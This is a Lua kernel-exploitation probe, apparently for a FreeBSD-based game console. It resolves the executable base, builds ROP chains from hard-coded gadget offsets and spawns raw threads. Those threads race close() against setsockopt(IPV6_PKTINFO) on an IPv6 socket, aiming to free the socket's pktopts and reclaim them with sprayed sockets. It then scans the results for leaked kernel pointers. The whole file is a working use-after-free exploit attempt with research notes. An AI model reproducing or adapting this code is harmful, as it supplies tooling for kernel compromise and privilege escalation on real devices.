-- CRASH_CLASS: HIGH
-- PROBE 1401b: IPv6 pktopts child-thread race v2
--
-- prior art: 1400a setsockopt(IPV6_PKTINFO)=0 with ifindex=0,
--   1401a baseline failed because ifindex=0x1234 is invalid,
--   396f child 5-arg via fn_addr stub, 384b fake TCB fix
--
-- Context: Race two child threads on the same IPv6 socket:
--   Child A: tight loop of close(fd)
--   Child B: tight loop of setsockopt(fd, IPPROTO_IPV6, IPV6_PKTINFO)
-- If close frees the socket (and its pktopts) while setsockopt
-- is mid-write, the freed pktopts can be reclaimed by spray sockets.
-- Detection: getsockopt on spray sockets returns a foreign marker.
--
-- Fix from 1401a: use ifindex=0 (valid) not 0x1234 (invalid).
-- Improvement: children loop N times each for wider race window.

print("=== PROBE 1401b: IPv6 PKTOPTS CHILD RACE v2 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local N = to_num
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end); if ok then return N(v) end; return nil end
local function safe_rq(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return v end; return nil end
local function safe_wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function safe_wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(v) if type(v) == "table" and v.h then return v.h, v.l end; return 0, N(v) end

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_thr_new    = mk(455)
local sc_mmap       = mk(477)
local sc_nanosleep  = mk(240)
local sc_thr_kill   = mk(433)

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPPROTO_UDP = 17

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = mk(593)
pcall(function() sc_info(uint64(0), info) end)
local eboot = (safe_rd(info + 0x10C) or 0) * 0x100000000 + (safe_rd(info + 0x108) or 0)
print(string.format("[0] eboot = 0x%X", eboot))

local pop_rax_ret = eboot + 0x992
local pop_rdi_ret = eboot + 0xC9DFE
local pop_rsi_ret = eboot + 0xD77D
local pop_rdx_ret = eboot + 0x3B02D7
local pop_rcx_ret = eboot + 0xE64
local pop_r8_ret  = eboot + 0x991
local bare_ret    = eboot + 0x42

local stub = N(syscall.pipe.fn_addr)
print(string.format("[1] fn_addr stub = 0x%X", stub))

-- Baseline: verify IPV6_PKTINFO works with ifindex=0
local test_fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
print(string.format("[2] test socket fd = %d", test_fd))
local pkt = memory.alloc(32)
safe_wq(pkt, uint64(0))
safe_wq(pkt + 8, uint64(0))
safe_wd(pkt + 16, 0)  -- ifindex=0 (valid!)
local r = N(sc_setsockopt(uint64(test_fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt), uint64(20)))
print(string.format("[2] setsockopt(PKTINFO, ifindex=0) = %d", r))
if r ~= 0 then
    -- Try with optlen=4 (boolean enable flag)
    safe_wd(pkt, 1)
    r = N(sc_setsockopt(uint64(test_fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt), uint64(4)))
    print(string.format("[2] setsockopt(PKTINFO, int=1, len=4) = %d", r))
end
sc_close(uint64(test_fd))
if r ~= 0 then
    print("[!] PKTINFO setsockopt failed on this connection — FATAL")
    print("=== PROBE 1401b ABORTED ===")
    return
end

-- Helper: build a ROP chain on a mmap'd stack and return thr_param
local function build_child(ops)
    local stack = N(sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if stack == 0 or stack >= 0xFFFFFFFF then return nil end

    -- Fake TCB for errno safety
    local fake_tcb = memory.alloc(0x1000)
    safe_wq(fake_tcb, uint64(N(fake_tcb)))
    local tcb_ptr = memory.alloc(8)
    safe_wq(tcb_ptr, uint64(N(fake_tcb)))

    -- Child RSP = ((stack + 0x200000) & ~0xF) - 8
    local child_rsp = math.floor((stack + 0x200000) / 16) * 16 - 8
    local pos = child_rsp

    local function push(val)
        safe_wq(pos, uint64(val))
        pos = pos + 8
    end

    -- Prepend: sysarch(SET_FSBASE=129, &tcb_ptr)
    push(pop_rdi_ret); push(129)
    push(pop_rsi_ret); push(N(tcb_ptr))
    push(pop_rax_ret); push(165)
    push(stub)

    -- User operations
    for _, op in ipairs(ops) do
        if op.rdi then push(pop_rdi_ret); push(op.rdi) end
        if op.rsi then push(pop_rsi_ret); push(op.rsi) end
        if op.rdx then push(pop_rdx_ret); push(op.rdx) end
        if op.rcx then push(pop_rcx_ret); push(op.rcx) end
        if op.r8  then push(pop_r8_ret);  push(op.r8)  end
        push(pop_rax_ret); push(op.num)
        push(stub)
    end

    -- Exit: thr_exit(0) = syscall 431
    push(pop_rdi_ret); push(0)
    push(pop_rax_ret); push(431)
    push(stub)

    -- Build thr_param struct
    local param = memory.alloc(0x40)
    safe_wq(param + 0x00, uint64(pop_rax_ret))   -- start_func (first gadget)
    safe_wq(param + 0x08, uint64(0))              -- arg
    safe_wq(param + 0x10, uint64(stack))          -- stack_base
    safe_wq(param + 0x18, uint64(0x200000))       -- stack_size
    local tid_out = memory.alloc(8)
    safe_wq(param + 0x30, uint64(N(tid_out)))     -- child_tid

    return param, tid_out
end

-- Phase 2: Race with looping children
print("")
print("--- Phase 2: Looping child race ---")

local ROUNDS = 20
local CLOSE_LOOPS = 50   -- child A: close(fd) x50
local SETOPT_LOOPS = 50  -- child B: setsockopt(fd) x50
local SPRAY_COUNT = 30
local anomalies = 0

for round = 1, ROUNDS do
    -- Create target socket with marker
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then
        print(string.format("[R%d] socket failed", round))
        break
    end

    -- Set marker via PKTINFO (ifindex = 0xAA00 + round)
    -- Actually use a valid ifindex for set, then read to verify
    safe_wq(pkt, uint64(0))
    safe_wq(pkt + 8, uint64(0))
    safe_wd(pkt + 16, 0)  -- ifindex=0 for set
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO),
        uint64(pkt), uint64(20))

    -- Build child A: loop close(fd) CLOSE_LOOPS times
    local close_ops = {}
    for i = 1, CLOSE_LOOPS do
        close_ops[#close_ops + 1] = {num = 6, rdi = fd}  -- close(fd)
    end

    -- Build child B: loop setsockopt(fd, IPV6_PKTINFO, marker) SETOPT_LOOPS times
    -- Each setsockopt with marker data in a different buffer
    local marker_buf = memory.alloc(32)
    safe_wq(marker_buf, uint64(0))
    safe_wq(marker_buf + 8, uint64(0))
    safe_wd(marker_buf + 16, 0)  -- ifindex=0

    local setopt_ops = {}
    for i = 1, SETOPT_LOOPS do
        setopt_ops[#setopt_ops + 1] = {
            num = 105,  -- setsockopt
            rdi = fd,
            rsi = IPPROTO_IPV6,
            rdx = IPV6_PKTINFO,
            rcx = N(marker_buf),
            r8 = 20
        }
    end

    -- Spawn both children
    local param_a, tid_a = build_child(close_ops)
    local param_b, tid_b = build_child(setopt_ops)

    if param_a and param_b then
        local ra = N(sc_thr_new(uint64(param_a), uint64(0x38)))
        local rb = N(sc_thr_new(uint64(param_b), uint64(0x38)))

        -- Brief sleep to let children run
        local slp = memory.alloc(16)
        safe_wq(slp, uint64(0))
        safe_wd(slp + 8, 50000000)  -- 50 ms
        sc_nanosleep(uint64(slp), uint64(0))

        -- Spray: create new IPv6 sockets that may reclaim the freed pktopts
        local spray_fds = {}
        for i = 1, SPRAY_COUNT do
            local sfd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
            if sfd >= 0 then
                -- Set each spray socket's PKTINFO with a distinct marker
                local sbuf = memory.alloc(32)
                safe_wq(sbuf, uint64(0))
                safe_wq(sbuf + 8, uint64(0))
                safe_wd(sbuf + 16, 0)
                local sr = N(sc_setsockopt(uint64(sfd), uint64(IPPROTO_IPV6),
                    uint64(IPV6_PKTINFO), uint64(sbuf), uint64(20)))
                if sr == 0 then
                    spray_fds[#spray_fds + 1] = sfd
                else
                    sc_close(uint64(sfd))
                end
            end
        end

        -- Check for anomalies: read each spray socket's PKTINFO
        -- If a spray socket's getsockopt returns unexpected data, we have overlap
        for i, sfd in ipairs(spray_fds) do
            local out = memory.alloc(32)
            -- Fill with sentinel
            safe_wq(out, uint64(0xDEADDEAD))
            safe_wq(out + 8, uint64(0xDEADDEAD))
            safe_wq(out + 16, uint64(0xDEADDEAD))
            local olen = memory.alloc(8)
            safe_wd(olen, 24)
            local gr = N(sc_getsockopt(uint64(sfd), uint64(IPPROTO_IPV6),
                uint64(IPV6_PKTINFO), uint64(out), uint64(olen)))
            if gr == 0 then
                -- Check all 20 bytes for non-zero (unexpected data from another socket)
                local q1h, q1l = get_hi_lo(safe_rq(out) or uint64(0))
                local q2h, q2l = get_hi_lo(safe_rq(out + 8) or uint64(0))
                local d5 = safe_rd(out + 16) or 0
                if q1l ~= 0 or q1h ~= 0 or q2l ~= 0 or q2h ~= 0 or d5 ~= 0 then
                    anomalies = anomalies + 1
                    print(string.format("[R%d] ANOMALY spray[%d] fd=%d: q1=0x%X%08X q2=0x%X%08X ifidx=0x%X",
                        round, i, sfd, q1h, q1l, q2h, q2l, d5))
                    -- Check if it looks like a kernel pointer
                    if q1h >= 0xFFFF8000 or q2h >= 0xFFFF8000 then
                        print("  *** KERNEL POINTER IN PKTINFO! ***")
                    end
                end
            end
        end

        -- Cleanup spray
        for _, sfd in ipairs(spray_fds) do sc_close(uint64(sfd)) end
    else
        print(string.format("[R%d] child build failed", round))
    end

    -- Small sleep between rounds
    local slp2 = memory.alloc(16)
    safe_wq(slp2, uint64(0))
    safe_wd(slp2 + 8, 5000000)  -- 5 ms
    sc_nanosleep(uint64(slp2), uint64(0))

    if round <= 5 or round % 5 == 0 then
        print(string.format("[R%d] done, anomalies=%d", round, anomalies))
    end
end

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies ===", ROUNDS, anomalies))
if anomalies > 0 then
    print("*** PKTOPTS DATA ANOMALY DETECTED ***")
    print("Next: examine anomaly data for kernel pointers or overlap evidence")
else
    print("No overlap in looping-child race.")
    print("Next: try larger loop counts, different timing, or alternative approach")
end
print("=== PROBE 1401b COMPLETE ===")
